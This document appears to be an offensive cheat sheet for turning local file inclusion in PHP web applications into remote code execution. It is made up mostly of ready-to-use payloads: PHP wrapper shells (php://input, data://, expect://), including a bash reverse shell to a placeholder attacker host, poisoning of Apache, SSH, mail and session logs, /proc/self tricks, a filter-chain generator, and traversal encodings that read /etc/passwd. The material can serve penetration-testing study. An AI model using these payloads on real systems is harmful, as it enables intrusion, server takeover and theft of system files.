# LFI to RCE — Attack Chain

## PHP Wrappers (Direct RCE)

### php://input (POST body as PHP)
```
GET /page?file=php://input HTTP/1.1
Content-Type: text/plain

<?php system($_GET['c']); ?>
```

### data:// wrapper
```
/page?file=data://text/plain,<?php system('id'); ?>
/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### expect:// wrapper (if enabled)
```
/page?file=expect://id
/page?file=expect://bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
```

### php://filter (read source code)
```
/page?file=php://filter/convert.base64-encode/resource=index.php
/page?file=php://filter/convert.base64-encode/resource=config.php
```

## Log Poisoning → RCE

### Apache Access Log
```bash
# 1. Inject PHP into User-Agent
curl -A "<?php system(\$_GET['c']); ?>" http://TARGET/

# 2. Include the log via LFI
/page?file=../../../var/log/apache2/access.log&c=id

# Common log paths:
# /var/log/apache2/access.log
# /var/log/apache2/error.log
# /var/log/httpd/access_log
# /var/log/nginx/access.log
# /var/log/nginx/error.log
```

### SSH Auth Log (if SSH accessible)
```bash
# 1. SSH with PHP payload as username
ssh '<?php system($_GET["c"]); ?>'@TARGET

# 2. Include via LFI
/page?file=../../../var/log/auth.log&c=id
```

### Mail Log
```bash
# 1. Send email with PHP in body
echo '<?php system($_GET["c"]); ?>' | mail -s "test" www-data@TARGET

# 2. Include mail log
/page?file=../../../var/mail/www-data&c=id
```

## Session Poisoning → RCE

```bash
# 1. Set a session variable containing PHP code
# (via form field, user-agent, or any session-stored input)
curl -b "PHPSESSID=testfile" "http://TARGET/login" -d "user=<?php system(\$_GET['c']); ?>"

# 2. Include session file
/page?file=../../../var/lib/php/sessions/sess_testfile&c=id
# Other paths: /tmp/sess_*, /var/lib/php5/sessions/
```

## /proc/self/environ (CGI)

```bash
# If accessible and running under CGI:
# 1. Set User-Agent with PHP code
curl -A "<?php system('id'); ?>" "http://TARGET/page?file=../../../proc/self/environ"
```

## /proc/self/fd (File Descriptors)

```bash
# Brute force file descriptors to find accessible log/pipe
for fd in $(seq 0 50); do
  curl "http://TARGET/page?file=../../../proc/self/fd/$fd" 2>/dev/null | grep -q "root:" && echo "FD $fd readable"
done
```

## PHP Filter Chain RCE (No File Write Needed)

```bash
# Modern technique: chain php://filter conversions to generate arbitrary PHP
# Tool: https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
# Outputs a long php://filter/... chain that generates PHP code from nothing
```

## Path Traversal Bypass

```
# Basic
../../../etc/passwd

# Double encoding
%252e%252e%252f  →  ../

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00

# Double slash
....//....//....//etc/passwd

# URL encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

# Mixed
..%2F..%2F..%2Fetc/passwd
..%5c..%5c..%5cetc/passwd  (Windows backslash)

# Absolute path (bypass prefix check)
/etc/passwd
```
